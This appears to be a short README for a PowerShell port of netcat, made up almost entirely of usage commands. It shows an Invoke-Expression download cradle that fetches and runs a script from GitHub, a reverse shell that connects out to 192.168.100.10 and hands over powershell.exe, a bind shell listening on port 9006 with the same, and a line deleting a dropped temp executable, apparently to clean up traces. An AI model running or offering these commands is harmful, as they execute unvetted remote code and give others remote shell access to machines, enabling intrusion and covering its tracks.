# PowerShell-Ncat (nc/netcat)

# Usage - Reverse Shell

Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/whitej3rry/PowerShell-Ncat/master/Invoke-Ncat.ps1')

Invoke-Ncat -ArgumentList "192.168.100.10 -v -ssl -e powershell.exe"

# Usage - Bind Shell
Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/whitej3rry/PowerShell-Ncat/master/Invoke-Ncat.ps1')

Invoke-Ncat -ArgumentList "-l 9006 -v -ssl -e powershell.exe"

# Remove Environment Variable

PS> Remove-Item $env:temp\tIaSTpEXB.exe
